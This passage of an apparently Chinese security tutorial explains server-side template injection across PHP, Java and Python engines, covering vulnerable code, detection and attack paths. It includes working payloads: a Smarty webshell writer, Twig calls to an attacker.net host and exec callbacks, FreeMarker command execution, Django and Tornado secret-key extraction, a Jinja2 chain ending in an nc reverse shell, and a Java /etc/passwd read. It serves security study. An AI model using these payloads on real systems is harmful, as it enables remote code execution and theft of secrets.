调用 M 或者其他的 C 进行处理，最后再返回给 V ，这样就最终显示在我们的面前了，那么这里的 V 中就大量的用到了一种叫做模板的技术，<strong>这种模板请不要认为只存在于 Python 中</strong>，感觉网上讲述的都是Python 的 SSTI ,在这之前也给了我非常大的误导(只能说自己没有好好研究，浅尝辄止)<strong>，请记住，凡是使用模板的地方都可能会出现 SSTI 的问题，SSTI 不属于任何一种语言，沙盒绕过也不是</strong>，沙盒绕过只是由于模板引擎发现了很大的安全漏洞，然后模板引擎设计出来的一种防护机制，不允许使用没有定义或者声明的模块，这适用于所有的模板引擎。</p><h2 id="0X03-常见的模板引擎"><a href="#0X03-常见的模板引擎" class="headerlink" title="0X03 常见的模板引擎"></a><strong>0X03 常见的模板引擎</strong></h2><h3 id="1-php-常用的"><a href="#1-php-常用的" class="headerlink" title="1.php 常用的"></a><strong>1.php 常用的</strong></h3><p><strong>Smarty</strong></p><p>Smarty算是一种很老的PHP模板引擎了，非常的经典，使用的比较广泛</p><p><strong>Twig</strong></p><p>Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。</p><p><strong>Blade</strong></p><p>Blade 是 Laravel 提供的一个既简单又强大的模板引擎。</p><p>和其他流行的 PHP 模板引擎不一样，Blade 并不限制你在视图中使用原生 PHP 代码。所有 Blade 视图文件都将被编译成原生的 PHP 代码并缓存起来，除非它被修改，否则不会重新编译，这就意味着 Blade 基本上不会给你的应用增加任何额外负担。</p><h3 id="2-Java-常用的"><a href="#2-Java-常用的" class="headerlink" title="2.Java 常用的"></a><strong>2.Java 常用的</strong></h3><p><strong>JSP</strong></p><p>这个引擎我想应该没人不知道吧，这个应该也是我最初学习的一个模板引擎，非常的经典</p><p><strong>FreeMarker</strong></p><p>FreeMarker是一款模板引擎： 即一种基于模板和要改变的数据， 并用来生成输出文本（HTML网页、电子邮件、配置文件、源代码等）的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。</p><p><strong>Velocity</strong></p><p>Velocity作为历史悠久的模板引擎不单单可以替代JSP作为Java Web的服务端网页模板引擎，而且可以作为普通文本的模板引擎来增强服务端程序文本处理能力。</p><h3 id="3-Python-常用的"><a href="#3-Python-常用的" class="headerlink" title="3.Python 常用的"></a><strong>3.Python 常用的</strong></h3><p><strong>Jinja2</strong></p><p>flask jinja2 一直是一起说的，使用非常的广泛，是我学习的第一个模板引擎</p><p><strong>django</strong></p><p>django 应该使用的是专属于自己的一个模板引擎，我这里姑且就叫他 django，我们都知道 django 以快速开发著称，有自己好用的ORM，他的很多东西都是耦合性非常高的，你使用别的就不能发挥出 django 的特性了</p><p><strong>tornado</strong></p><p>tornado 也有属于自己的一套模板引擎，tornado 强调的是异步非阻塞高并发</p><h3 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a><strong>4.注意：</strong></h3><p>同一种语言不同的模板引擎支持的语法虽然很像，但是还是有略微的差异的，比如</p><p>tornado render() 中支持传入自定义函数，以及函数的参数，然后在两个大括号</p><pre><code class="hljs">&#123;&#123;&#125;&#125;</code></pre><p>中执行,但是 django 的模板引擎相对于tornado 来说就相对难用一些（<strong>当然方便永远和安全是敌人</strong>）</p><h2 id="0X04-SSTI-怎么产生的"><a href="#0X04-SSTI-怎么产生的" class="headerlink" title="0X04 SSTI 怎么产生的"></a><strong>0X04 SSTI 怎么产生的</strong></h2><p>服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题.</p><blockquote><p><strong>补充：</strong></p><p>单纯的字符串拼接并不能带来注入问题，关键要看你拼接的是什么，如果是控制语句，就会造成数据域与代码域的混淆，这样就会出洞</p></blockquote><p><strong>当然，这种情况一般不属于模板引擎的问题，大多数原因都是开发者并没有很好的处理，比如下面的php 代码</strong></p><h3 id="1-PHP-实例"><a href="#1-PHP-实例" class="headerlink" title="1.PHP 实例"></a><strong>1.PHP 实例</strong></h3><p><strong>示例PHP代码1：</strong></p><pre><code class="hljs">&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello &#123;&#123;name&#125;&#125;&quot;, array(&quot;name&quot; =&gt; $_GET[&quot;name&quot;]));  // 将用户输入作为模版变量的值echo $output;</code></pre><p>这段代码明显没有什么问题，用户的输入到时候渲染的时候就是 name 的值，由于name 外面已经有</p><pre><code class="hljs">&#123;&#123;&#125;&#125;</code></pre><p>了，也就是说，到时候显示的只是name 变量的值，就算你输入了 </p><pre><code class="hljs">&#123;&#123;xxx&#125;&#125; </code></pre><p>输出也只是</p><pre><code class="hljs">&#123;&#123;xxx&#125;&#125;</code></pre><p>而不会将xxx 作为模板变量解析</p><p>但是有些代码就是不这么写，比如下面这段代码</p><p><strong>示例PHP代码2：</strong></p><pre><code class="hljs">&lt;?phprequire_once dirname(__FILE__).‘/../lib/Twig/Autoloader.php‘;Twig_Autoloader::register(true);$twig = new Twig_Environment(new Twig_Loader_String());$output = $twig-&gt;render(&quot;Hello &#123;$_GET[‘name‘]&#125;&quot;);  // 将用户输入作为模版内容的一部分echo $output;</code></pre><p>你看，现在开发者将用户的输入直接放在要渲染的字符串中了</p><p>**注意：不要把这里的</p><pre><code class="hljs">&#123;&#125;</code></pre><p>当成是模板变量外面的括号，这里的括号实际上只是为了区分变量和字符串常量而已**，于是我们输入 </p><pre><code class="hljs">&#123;&#123;xxx&#125;&#125;</code></pre><p>就非常的符合模板的规则，模板引擎一高兴就给解析了，然后服务器就凉了。</p><p><strong>这里演示的是PHP 的代码，使用的是 Twig 模板引擎，下面我们看一下 python 的 jinja2</strong></p><h3 id="2-Python-实例"><a href="#2-Python-实例" class="headerlink" title="2.Python 实例"></a><strong>2.Python 实例</strong></h3><h4 id="实例一："><a href="#实例一：" class="headerlink" title="实例一："></a><strong>实例一：</strong></h4><p><strong>示例Python代码1：</strong></p><pre><code class="hljs">@app.errorhandler(404)def page_not_found(e):    template = &#39;&#39;&#39;&#123;%% extends "layout.html" %%&#125;&#123;%% block body %%&#125;    &lt;div class=&quot;center-content error&quot;&gt;        &lt;h1&gt;Oops! That page doesn&#39;t exist.&lt;/h1&gt;        &lt;h3&gt;%s&lt;/h3&gt;    &lt;/div&gt;&#123;%% endblock %%&#125;&#39;&#39;&#39; % (request.url)    return render_template_string(template), 404</code></pre><p>这是一段经典的 flask 源码，@app.errorhandler(404) 这一部分是装饰器，用于检测404用的，和最后的 ,404呼应的，这与我们这次的测试无关</p><p>我们看到，这里本身开发者并没有打算用到什么模板语法，就是使用了一个字符串的格式化来传递一个 url ，但是你别忘了你还是用模板的方式去渲染的啊，也就是说还是支持模板引擎支持的语法，那我们为什么不能输入模板引擎的语法呢？<strong>（永远不要相信用户的输入）</strong></p><p>于是我们就能在URL后面跟上</p><pre><code class="hljs">&#123;&#123; 7+7 &#125;&#125;</code></pre><p>自然而然就能计算出 49 了</p><h4 id="实例二："><a href="#实例二：" class="headerlink" title="实例二："></a><strong>实例二：</strong></h4><p><strong>示例Python代码2：</strong></p><pre><code class="hljs"># coding: utf-8import sysfrom jinja2 importTemplate template = Template(&quot;Your input: &#123;&#125;&quot;.format(sys.argv[1] if len(sys.argv) &gt; 1 else &#39;&lt;empty&gt;&#39;))print template.render()</code></pre><p>和上面一样，还是格式化字符串，读者可以自己思考并尝试</p><p><strong>说了 Python 和  PHP 当然不能少了最重要的 JAVA</strong> </p><h3 id="3-JAVA-实例："><a href="#3-JAVA-实例：" class="headerlink" title="3.JAVA 实例："></a><strong>3.JAVA 实例：</strong></h3><h4 id="实例一：-1"><a href="#实例一：-1" class="headerlink" title="实例一："></a><strong>实例一：</strong></h4><p>漏洞分析：<a href="https://paper.seebug.org/70/">https://paper.seebug.org/70/</a><br>作者挖掘记录：<a href="https://secalert.net/#cve-2016-4977">https://secalert.net/#cve-2016-4977</a></p><p>这个漏洞相对于前面的就显得很神奇了，我下面简单的说一下，想看详细的可以看上面的链接：</p><p><strong>漏洞浅析：</strong></p><p>我们访问这个URL 的时候会报错并在页面上输出  K0rz3n</p><pre><code class="hljs">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=K0rz3n</code></pre><p>为什么会报错呢？因为K0rz3n 并不符合 redirect_uri 的格式规范</p><p>但当我们请求下面这个URL 的时候</p><pre><code class="hljs">http://localhost:8080/oauth/authorize?response_type=token&amp;client_id=acme&amp;redirect_uri=$&#123;2334-1&#125;</code></pre><p>同样会报错，但是非常奇怪的是，我们的 </p><pre><code class="hljs">$&#123;&#125;</code></pre><p>表达式居然被执行了，输出了 2333，模板注入实锤了，我们来看一下代码，分析一下</p><blockquote><p>路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\WhitelabelErrorEndpoint.java</p></blockquote><p><strong>WhitelabelErrorEndpoint.java</strong></p><pre><code class="hljs">@FrameworkEndpointpublic class WhitelabelErrorEndpoint &#123;private static final String ERROR = &quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;OAuth Error&lt;/h1&gt;&lt;p&gt;$&#123;errorSummary&#125;&lt;/p&gt;&lt;/body&gt;&lt;/html&gt;&quot;; //这里是我们的字符串模板@RequestMapping(&quot;/oauth/error&quot;)public ModelAndView handleError(HttpServletRequest request) &#123;Map&lt;String, Object&gt; model = new HashMap&lt;String, Object&gt;();Object error = request.getAttribute(&quot;error&quot;);// The error summary may contain malicious user input,// it needs to be escaped to prevent XSSString errorSummary;if (error instanceof OAuth2Exception) &#123;OAuth2Exception oauthError = (OAuth2Exception) error;errorSummary = HtmlUtils.htmlEscape(oauthError.getSummary());&#125;else &#123;errorSummary = &quot;Unknown error&quot;;&#125;model.put(&quot;errorSummary&quot;, errorSummary);return new ModelAndView(new SpelView(ERROR), model);//通过模板渲染&#125;&#125;</code></pre><p>我们看到，当拿到错误信息以后，就交给了 SpelView(),我们跟进去看一下</p><blockquote><p>路径：\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth-2.0.9.RELEASE\spring-security-oauth2\src\main\java\org\springframework\security\oauth2\provider\endpoint\SpelView.java</p></blockquote><p><strong>SpelView.java</strong></p><pre><code class="hljs">class SpelView implements View &#123;    ...    public SpelView(String template) &#123;        this.template = template;        this.context.addPropertyAccessor(new MapAccessor());        this.helper = new PropertyPlaceholderHelper(&quot;$&#123;&quot;, &quot;&#125;&quot;);        this.resolver = new PlaceholderResolver() &#123;            public String resolvePlaceholder(String name) &#123;//这里相当于是去一层$&#123;&#125;                Expression expression = parser.parseExpression(name);                Object value = expression.getValue(context);                return value == null ? null : value.toString();            &#125;        &#125;;    &#125;    ...    public void render(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)            throws Exception &#123;        ...        String result = helper.replacePlaceholders(template, resolver);//replacePlaceholders是一个递归调用，能将第二个参数的$&#123;&#125; 中的值取出来，不管有多少层括号        ...    &#125;&#125;</code></pre><p>resolver 这个参数是经过递归的去</p><pre><code class="hljs">$&#123;&#125;</code></pre><p>处理的，不信我们看一下 replacePlaceholders()</p><pre><code class="hljs">public String replacePlaceholders(String value, final Properties properties) &#123;Assert.notNull(properties, &quot;&#39;properties&#39; must not be null&quot;);return replacePlaceholders(value, new PlaceholderResolver() &#123;@Overridepublic String resolvePlaceholder(String placeholderName) &#123;return properties.getProperty(placeholderName);&#125;&#125;);&#125;</code></pre><p>很明显这里面递归调用了replacePlaceholders() 函数，最终能得到单纯的表达式，然后渲染的时候放在 </p><pre><code class="hljs">$&#123;&#125;</code></pre><p>就执行了。</p><h4 id="实例二：-1"><a href="#实例二：-1" class="headerlink" title="实例二："></a><strong>实例二：</strong></h4><p>在2015年的blackhat 大会上曾讲述了Alfresco 的一个 SSTI 漏洞，不过很遗憾我没有找到源码，没能亲自分析，只能拿来payload 分析一下。</p><p><strong>实例代码：</strong></p><pre><code class="hljs">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</code></pre><p><strong>结果：</strong></p><pre><code class="hljs">uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7) </code></pre><blockquote><p><strong>解释：</strong><br><a href="https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new">https://freemarker.apache.org/docs/ref_builtins_expert.html#ref_builtin_new</a><br>经过我查阅上述freemarker 的文档，这里面的 ?new() 是其高级内置函数</p></blockquote><p><strong>用法如下：</strong></p><pre><code class="hljs">&lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt;&lt;#assign word_wrapp =“com.acmee.freemarker.WordWrapperDirective”？new（）&gt;&lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt;&lt;#assign word_wrapp_narrow =“com.acmee.freemarker.WordWrapperDirective”？new（40）&gt;</code></pre><p>相当于是，调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Excute</p><h2 id="0X05-检测方法"><a href="#0X05-检测方法" class="headerlink" title="0X05 检测方法"></a><strong>0X05 检测方法</strong></h2><p>同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。</p><p>简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。</p><p><strong>示意图如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/SSTI%E6%B5%85%E6%9E%90-%E6%A3%80%E6%B5%8B%E5%8E%9F%E7%90%86.png" alt="此处输入图片的描述"></p><blockquote><p>**注意：**有的时候出现 XSS 的时候，也有可能是 SSTI 漏洞，虽说模板引擎在大多数情况下都是使用的xss 过滤的，但是也不排除有些意外情况的出现，比如<br>有的模板引擎(比如 jinja2)在渲染的时候默认只针对特定的文件后缀名的文件(html,xhtml等)进行XSS过滤</p></blockquote><p>这里提供一个大牛写的 SSTI 的检测工具 <a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p><h2 id="0X06-攻击思路"><a href="#0X06-攻击思路" class="headerlink" title="0X06 攻击思路"></a><strong>0X06 攻击思路</strong></h2><h3 id="1-攻击方向："><a href="#1-攻击方向：" class="headerlink" title="1.攻击方向："></a><strong>1.攻击方向：</strong></h3><p>找到模板注入主要从三个方向进行攻击</p><p>(1)模板本身<br>(2)框架本身<br>(3)语言本身<br>(4)应用本身</p><h3 id="2-攻击方法："><a href="#2-攻击方法：" class="headerlink" title="2.攻击方法："></a><strong>2.攻击方法：</strong></h3><p>我们知道 SSTI 能够造成很多种危害，包括 敏感信息泄露、RCE、GetShell 等，关键就在于如何才能利用这个注入点执行我们想执行的代码，那么我们寻找利用点的范围实际上就是在我们上面的四个地方，一个是模板本身支持的语法、内置变量、属性、函数，还有就是纯粹框架的全局变量、属性、函数，然后我们考虑语言本身的特性，比如 面向对象的内省机制，最最最后我们无能为力的时候才考虑怎么寻找应用定义的一些东西，因为这个是几乎没有文档的，是开发者的自行设计，一般需要拿到应用的源码才能考虑，于是我将其放在最后一个</p><blockquote><p><strong>注意：</strong></p><p>在这种面向对象的语言中，获取父类这种思想要贯穿始终，理论基础就是 Python 的魔法方法 PHP 的自省 JAVA 的反射 机制</p></blockquote><h4 id="1-利用模板本身的特性进行攻击"><a href="#1-利用模板本身的特性进行攻击" class="headerlink" title="1.利用模板本身的特性进行攻击"></a><strong>1.利用模板本身的特性进行攻击</strong></h4><h5 id="1-Smarty"><a href="#1-Smarty" class="headerlink" title="1.Smarty"></a><strong>1.Smarty</strong></h5><p>Smarty是最流行的PHP模板语言之一，为不受信任的模板执行提供了安全模式。这会强制执行在 php 安全函数白名单中的函数，因此我们在模板中无法直接调用 php 中直接执行命令的函数(相当于存在了一个disable_function)</p><p>但是，实际上对语言的限制并不能影响我们执行命令，因为我们首先考虑的应该是模板本身，恰好 Smarty 很照顾我们，在阅读模板的文档以后我们发现：$smarty内置变量可用于访问各种环境变量，比如我们使用 self 得到 smarty 这个类以后我们就去找 smarty 给我们的好用的方法</p><p>比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_data.php#L385">getStreamVariable()</a></p><p>github 中明确指出，这个方法可以获取传入变量的流（说人话就是读文件）</p><p><strong>payload:</strong></p><pre><code class="hljs">&#123;self::getStreamVariable(&quot;file:///proc/self/loginuid&quot;)&#125;</code></pre><p>再比如：<a href="https://github.com/smarty-php/smarty/blob/fa269d418fb4d3687558746e67e054c225628d13/libs/sysplugins/smarty_internal_write_file.php#L16">class Smarty_Internal_Write_File</a></p><p>有了上面的读文件当然要找一个写文件的了，这个类中有一个writeFile方法</p><p><strong>函数原型：</strong></p><pre><code class="hljs">public function writeFile($_filepath, $_contents, Smarty $smarty)</code></pre><p>但是这个第三个参数是一个 Smarty 类型，后来找到了 <code>self::clearConfig()</code></p><p><strong>函数原型：</strong></p><pre><code class="hljs">public function clearConfig($varname = null)&#123;    return Smarty_Internal_Extension_Config::clearConfig($this, $varname);&#125;</code></pre><p>能写文件对攻击者真的是太有利了，一般不出意外能直接 getshell</p><p><strong>payload：</strong></p><pre><code class="hljs">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</code></pre><h5 id="2-Twig"><a href="#2-Twig" class="headerlink" title="2.Twig"></a><strong>2.Twig</strong></h5><p>相比于 Smarty ,Twig 无法调用静态方法，并且所有函数的返回值都转换为字符串，也就是我们不能使用 <code>self::</code> 调用静态变量了，但是 通过<a href="https://twig.symfony.com/doc/2.x/templates.html">官方文档</a>的查询</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_self.png" alt="此处输入图片的描述"></p><p>Twig 给我们提供了一个 <code>_self</code>, 虽然 <code>_self</code> 本身没有什么有用的方法，但是却有一个 env</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_env.png" alt="此处输入图片的描述"></p><p>env是指属性Twig_Environment对象，Twig_Environment对象有一个 setCache方法可用于更改Twig尝试加载和执行编译模板（PHP文件）的位置(不知道为什么官方文档没有看到这个方法，后来我找到了Twig 的源码中的 environment.php</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Twig_setCache.png" alt="此处输入图片的描述"></p><p>因此，明显的攻击是通过将缓存位置设置为远程服务器来引入远程文件包含漏洞：</p><p><strong>payload:</strong></p><pre><code class="hljs">&#123;&#123;_self.env.setCache("ftp://attacker.net:2121")&#125;&#125;&#123;&#123;_self.env.loadTemplate("backdoor")&#125;&#125;</code></pre><p><strong>但是新的问题出现了</strong>，allow_url_include 一般是不打开的，没法包含远程文件，没关系还有个调用过滤器的函数 <a href="https://github.com/twigphp/Twig/blob/e22fb8728b395b306a06785a3ae9b12f3fbc0294/lib/Twig/Environment.php#L874">getFilter()</a></p><p>这个函数中调用了一个 call_user_function 方法</p><pre><code class="hljs">public function getFilter($name)&#123;        [snip]        foreach ($this-&gt;filterCallbacks as $callback) &#123;        if (false !== $filter = call_user_func($callback, $name)) &#123;//注意这行            return $filter;        &#125;    &#125;    return false;&#125;public function registerUndefinedFilterCallback($callable)&#123;    $this-&gt;filterCallbacks[] = $callable;&#125; </code></pre><p>我们只要把exec() 作为回调函数传进去就能实现命令执行了</p><p><strong>payload:</strong></p><pre><code class="hljs">&#123;&#123;_self.env.registerUndefinedFilterCallback("exec")&#125;&#125;&#123;&#123;_self.env.getFilter("id")&#125;&#125;</code></pre><h5 id="3-freeMarker"><a href="#3-freeMarker" class="headerlink" title="3.freeMarker"></a><strong>3.freeMarker</strong></h5><p>这个模板主要用于 java ，在上面我举例 java 的 SSTI 的时候我已经简答的分析过这个的一个 payload，我希望读者也能按照 查找文档，查看框架源码，等方式寻找这个 payload 的思路来源</p><p><strong>payload:</strong></p><pre><code class="hljs">&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</code></pre><h4 id="2-利用框架本身的特性进行攻击"><a href="#2-利用框架本身的特性进行攻击" class="headerlink" title="2.利用框架本身的特性进行攻击"></a><strong>2.利用框架本身的特性进行攻击</strong></h4><p>因为这里面的摸吧模板似乎都是内置于框架内的，于是我就将其放在利用框架这一节</p><h5 id="1-Django"><a href="#1-Django" class="headerlink" title="1.Django"></a><strong>1.Django</strong></h5><pre><code class="hljs">def view(request, *args, **kwargs):    template = &#39;Hello &#123;user&#125;, This is your email: &#39; + request.GET.get(&#39;email&#39;)    return HttpResponse(template.format(user=request.user))</code></pre><p>注入点很明显就是 email，但是如果我们的能力已经被限制的很死，很难执行命令，但又想获取和 User  有关的配置信息的话，我么怎么办？</p><p>可以发现我们现在拿到的只有有一个 和user 有关的变量，那就是 request user ，那我们的思路是什么？</p><p>p牛在自己的博客中分享了这个思路，我把它引用过来：</p><blockquote><p>Django是一个庞大的框架，其数据库关系错综复杂，我们其实是可以通过属性之间的关系去一点点挖掘敏感信息。但Django仅仅是一个框架，在没有目标源码的情况下很难去挖掘信息，所以我的思路就是：去挖掘Django自带的应用中的一些路径，最终读取到Django的配置项</p></blockquote><p>什么意思，简单地说就是我们在没有应用源码的情况下要学会去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用，然后一步一步的靠近我们的目标</p><p>后来我们发现，经过翻找，我发现Django自带的应用“admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件：</p><p><strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/django-seetings.png" alt="此处输入图片的描述"></p><p>所以，思路就很明确了：我们只需要通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。</p><p><strong>payload:</strong></p><pre><code class="hljs">http://localhost:8000/?email=&#123;user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;http://localhost:8000/?email=&#123;user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY&#125;</code></pre><h5 id="2-Flask-Jinja2"><a href="#2-Flask-Jinja2" class="headerlink" title="2.Flask&#x2F;Jinja2"></a><strong>2.Flask&#x2F;Jinja2</strong></h5><p>config 是Flask模版中的一个全局对象，它代表“当前配置对象(flask.config)”，它是一个类字典的对象，它包含了所有应用程序的配置值。在大多数情况下，它包含了比如数据库链接字符串，连接到第三方的凭证，SECRET_KEY等敏感值。虽然config是一个类字典对象，但是通过查阅文档可以发现 config 有很多神奇的方法：from_envvar, from_object, from_pyfile, 以及root_path。</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/flask-config.png" alt="此处输入图片的描述"></p><p>这里我们利用 from_pyfile 和  from_object 来命令执行，下面是这两个函数的源代码（为了阅读清晰，注释我删除了）</p><p><strong>源码：</strong></p><pre><code class="hljs">def from_pyfile(self, filename, silent=False):    filename = os.path.join(self.root_path, filename)    d = types.ModuleType(&#39;config&#39;)    d.__file__ = filename    try:        with open(filename) as config_file:            exec(compile(config_file.read(), filename, &#39;exec&#39;), d.__dict__)    except IOError as e:        if silent and e.errno in (errno.ENOENT, errno.EISDIR):            return False        e.strerror = &#39;Unable to load configuration file (%s)&#39; % e.strerror        raise    self.from_object(d)    return Truedef from_object(self, obj):    if isinstance(obj, string_types):        obj = import_string(obj)    for key in dir(obj):        if key.isupper():            self[key] = getattr(obj, key)</code></pre><p><strong>简单的解释一下这个方法：</strong></p><p>这个方法将传入的文件使用 compile() 这个python 的内置方法将其编译成字节码(.pyc),并放到 exec() 里面去执行，注意最后一个参数 <code>d.__dict__</code>翻阅文档发现，这个参数的含义是指定 exec 执行的上下文，</p><p><strong>如图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/Python%20exec.png" alt="此处输入图片的描述"></p><p>我们简单的模拟一下看一下效果</p><p><strong>如图所示:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/d.__dict__2.png" alt="此处输入图片的描述"></p><p>执行的代码片段被放入了 <code>d.__dict__</code> 中,这看似没设么用，但是神奇的是后面他调用了 from_object() 方法，根据源码</p><pre><code class="hljs"> for key in dir(obj):            if key.isupper():                self[key] = getattr(obj, key)</code></pre><p>这个方法会遍历  Obj 的 dict 并且找到大写字母的属性，将属性的值给 self[‘属性名’]，所以说如果我们能让 from_pyfile 去读这样的一个文件</p><pre><code class="hljs">from os import systemSHELL = system</code></pre><p>到时候我们就能通过 config[‘SHELL’] 调用 system 方法了</p><p>那么文件怎么写入呢？Jinja2 有沙盒机制，我们必须通过绕过沙盒的方式写入我们想要的文件，具体的沙盒绕过可以参考我的一篇博文<a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">python 沙盒逃逸备忘</a></p><p><strong>最终的 payload:</strong></p><pre><code class="hljs">&#123;&#123; ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evil', 'w').write('from os import system%0aSHELL = system') &#125;&#125;//写文件&#123;&#123; config.from_pyfile('/tmp/evil') &#125;&#125;//加载system&#123;&#123; config['SHELL']('nc xxxx xx -e /bin/sh') &#125;&#125;//执行命令反弹SHELL</code></pre><h5 id="3-Tornado"><a href="#3-Tornado" class="headerlink" title="3.Tornado"></a><strong>3.Tornado</strong></h5><p>写文章的时候正巧赶上护网杯出了一道 tornado 的 SSTI 于是这里也作为一个比较好的例子给大家说明</p><p>根据提示这道题的意思就是通过SSTI 获取 cookie_secret，但是这里过滤了很多东西</p><pre><code class="hljs">&quot;%&#39;()*-/=[\]_|</code></pre><p>甚至把_(下划线)都过滤了，也就是说我们没法通过Python 的魔法方法进行沙盒逃逸执行命令，并且实际上对我们的寻找合适的 tornado 的内置的方法也有很多的限制。</p><p>我觉得除了直接阅读官方的文档，还有一个重要的方法就是直接下载 tornado 的框架源码，全局搜索 cookie_secret</p><p><strong>如下图：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/cookie_secret.png" alt="此处输入图片的描述"></p><p>你会发现 cookie_secret 是handler.application.settings 的键值，那我们只要获取到这个对象是不是就可以了，没错，那么 handler 是什么，看<a href="http://www.tornadoweb.org/en/stable/guide/templates.html#template-syntax">官方文档</a>，我特地看一下模板的对框架的语法支持(因为，模板中有一些内置的对象等同于框架中的对象，但是一般为了方便书写前段就会给一个比较简单的名字，就比如 JSP 的 request 内置对象实际上对应着 servlet 中的 HttpServletRequest  )</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler.png" alt="此处输入图片的描述"></p><p>这里明确写着 handler 对应的就是 RequestHandler,那么也就是说，我们可以使用 handler 调用 RequestHandler 的方法，我们还是看<a href="https://www.tornadoweb.org/en/stable/web.html?highlight=RequestHandler">官方文档</a></p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/handler_settings.png" alt="此处输入图片的描述"></p><p>很清楚，我么看到 RequestHandler.settings  是  self.application.settings 的别名，等等！ 有没有觉得有些似曾相识？对啊，这不就是我们之前在框架源码中找到的那个东西吗，也就是说我们能直接通过 handler.settings 访问到 我们朝思暮想的 cookie_secret ，至此我的分析就结束了。</p><p><strong>payload:</strong></p><pre><code class="hljs">http://117.78.26.79:31093/error?msg=&#123;&#123;handler.settings&#125;&#125;</code></pre><h4 id="2-利用模语言本身的特性进行攻击"><a href="#2-利用模语言本身的特性进行攻击" class="headerlink" title="2.利用模语言本身的特性进行攻击"></a><strong>2.利用模语言本身的特性进行攻击</strong></h4><h5 id="1-Python"><a href="#1-Python" class="headerlink" title="1.Python"></a><strong>1.Python</strong></h5><p>Python 最最经典的就是使用魔法方法，这里就涉及到Python沙盒绕过了，前面说过，模板的设计者也发现了模板的执行命令的特性，于是就给模本增加了一种沙盒的机制，在这个沙盒中你很难执行一般我们能想到函数，基本都被禁用了，所以我们不得不使用自省的机制来绕过沙盒，具体的方法就是在我的<a href="http://www.k0rz3n.com/2018/05/04/Python%20%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E5%A4%87%E5%BF%98/">一篇博文</a>中</p><h5 id="2-JAVA"><a href="#2-JAVA" class="headerlink" title="2.JAVA"></a><strong>2.JAVA</strong></h5><p>java.lang包是java语言的核心，它提供了java中的基础类。包括基本Object类、Class类、String类、基本类型的包装类、基本的数学类等等最基本的类</p><p><strong>如下图所示：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/java.lang.png" alt="此处输入图片的描述"></p><p>有了这个基础我们就能想到这样的payload</p><p><strong>payload：</strong></p><pre><code class="hljs">$&#123;T(java.lang.System).getenv()&#125;$&#123;T(java.lang.Runtime).getRuntime().exec(&#39;cat etc/passwd&#39;)&#125;</code></pre><p>当然要是文件操作就要用另外的类了,思路是不变的</p><p><strong>payload：</strong></p><pre><code 